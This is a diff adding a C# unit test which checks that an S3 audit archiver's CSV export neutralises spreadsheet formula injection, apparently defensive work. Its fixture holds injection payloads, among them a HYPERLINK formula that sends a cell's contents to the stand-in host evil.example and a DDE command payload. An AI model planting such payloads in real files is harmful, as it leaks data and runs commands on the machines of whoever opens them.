@@ -81,6 +81,47 @@ public class S3AuditArchiverTests
     }
 
     [Fact]
+    public async Task ExportAsync_WithCsvFormat_ShouldNeutralizeSpreadsheetFormulas()
+    {
+        var from = DateTime.UtcNow.AddDays(-7);
+        var to = DateTime.UtcNow;
+        var timestamp = new DateTime(2026, 10, 23, 12, 0, 0, DateTimeKind.Utc);
+        var events = new List<AuditEvent>
+        {
+            new()
+            {
+                Id = "e1",
+                UserId = "=HYPERLINK(\"https://evil.example/\"&A1)",
+                Action = "+cmd|' /C calc'!A0",
+                ResourceType = "-2+3",
+                ResourceId = "@SUM(1,2)",
+                IpAddress = "\t=1",
+                UserAgent = "\r=1",
+                Timestamp = timestamp,
+            },
+            new() { Id = "e2", UserId = "u-2", Action = "create", ResourceType = "doc", ResourceId = "d-2", IpAddress = "10.0.0.1", UserAgent = "curl/8.0", Timestamp = timestamp },
+        };
+
+        _mockRepository.Setup(r => r.GetEventsByDateRangeAsync(from, to)).ReturnsAsync(events);
+        PutObjectRequest? captured = null;
+        _mockS3.Setup(s => s.PutObjectAsync(It.IsAny<PutObjectRequest>(), default))
+            .Callback<PutObjectRequest, CancellationToken>((req, _) => captured = req)
+            .ReturnsAsync(new PutObjectResponse());
+
+        await _archiver.ExportAsync(from, to, "csv");
+
+        Assert.NotNull(captured);
+        var lines = captured!.ContentBody.Split(Environment.NewLine);
+        Assert.Equal("Id,Timestamp,UserId,Action,ResourceType,ResourceId,IpAddress,UserAgent", lines[0]);
+        Assert.Equal(
+            "\"e1\",\"2026-10-23T12:00:00.0000000Z\",\"'=HYPERLINK(\"\"https://evil.example/\"\"&A1)\",\"'+cmd|' /C calc'!A0\",\"'-2+3\",\"'@SUM(1,2)\",\"'\t=1\",\"'\r=1\"",
+            lines[1]);
+        Assert.Equal(
+            "\"e2\",\"2026-10-23T12:00:00.0000000Z\",\"u-2\",\"create\",\"doc\",\"d-2\",\"10.0.0.1\",\"curl/8.0\"",
+            lines[2]);
+    }
+
+    [Fact]
     public async Task ArchiveOldEventsAsync_WithEvents_ShouldUploadToGlacierAndDelete()
     {
         var olderThan = DateTime.UtcNow.AddDays(-90);
